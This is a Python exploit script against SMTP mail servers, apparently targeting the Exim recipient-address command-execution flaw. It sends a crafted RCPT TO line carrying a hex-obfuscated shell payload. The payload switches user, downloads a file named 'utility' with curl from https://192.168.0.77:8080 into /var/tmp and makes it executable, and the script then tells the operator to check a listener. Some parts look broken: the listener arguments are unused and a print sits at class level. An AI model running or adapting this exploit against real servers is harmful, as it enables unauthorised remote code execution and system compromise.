class Args(object):
    def __init__(self):
        import argparse
        self.parser = argparse.ArgumentParser()

    def parser_error(self, errmsg):
        print("Usage: python " + argv[0] + " use -h for help")
        exit("Error: {}".format(errmsg))

    def parse_args(self):
        self.parser._optionals.title = "OPTIONS"
        self.parser.add_argument('--rhost', help = "Server Host", required = True)
        self.parser.add_argument('--rport', help = "Server Port", default = 25, type = int)
        self.parser.add_argument('--lhost', help = 'IPv4', required = True)
        self.parser.add_argument('--lport', help = 'Port', type = int, required = True)
        return self.parser.parse_args()

class Exploit(object):
    def __init__(self, rhost, rport, lhost, lport):
        self._rhost = rhost
        self._rport = rport
        self._lhost = lhost
        self._lport = lport
        self._payload = '\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x20\\x2d\\x63\\x20\\x27\\x73\\x75\\x20\\x2d\\x20\\x65\\x78\\x70\\x6c\\x6f\\x69\\x74\\x20\\x2d\\x63\\x20\\x22\\x63\\x75\\x72\\x6c\\x20\\x2d\\x6b\\x20\\x2d\\x6f\\x20\\x2f\\x76\\x61\\x72\\x2f\\x74\\x6d\\x70\\x2f\\x75\\x74\\x69\\x6c\\x69\\x74\\x79\\x20\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x31\\x39\\x32\\x2e\\x31\\x36\\x38\\x2e\\x30\\x2e\\x37\\x37\\x3a\\x38\\x30\\x38\\x30\\x2f\\x75\\x74\\x69\\x6c\\x69\\x74\\x79\\x22\\x3b\\x20\\x63\\x68\\x6d\\x6f\\x64\\x20\\x2b\\x78\\x20\\x2f\\x76\\x61\\x72\\x2f\\x74\\x6d\\x70\\x2f\\x75\\x74\\x69\\x6c\\x69\\x74\\x79\\x27'
        
        
        self._run()
        
    def _ehlo(self):
        return 'EHLO {0}\r\n'.format(self._rhost)
    
    def _from(self):
        return 'MAIL FROM:<>\r\n'
    
    def _to(self):
        return 'RCPT TO:<${{run{{{0}}}}}@{1}>\r\n'.format(self._payload, self._rhost)
    
    def _data(self):
        return 'DATA\r\n'

    def _body(self):
        body = ''
        for i in range(1, 32):
            body = body + 'Received: {0}\r\n'.format(i)
        return body + '.\r\n'
    
    def _run(self):
        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self._rhost, self._rport))
        # print(self._ehlo())
        # print(self._from())
        # print(self._to())
        # print(self._data())
        # print(self._body())
        sock.recv(1024)
        sock.send(self._ehlo())
        sock.recv(1024)
        sock.send(self._from())
        sock.recv(1024)
        sock.send(self._to())
        sock.recv(1024)
        sock.send(self._data())
        sock.recv(1024)
        sock.send(self._body())
        sock.recv(1024)
    print('[+] Exploited. Check your listener')

if __name__ == '__main__':
    args = Args().parse_args()
    Exploit(rhost = args.rhost, rport = args.rport, lhost = args.lhost, lport = args.lport)
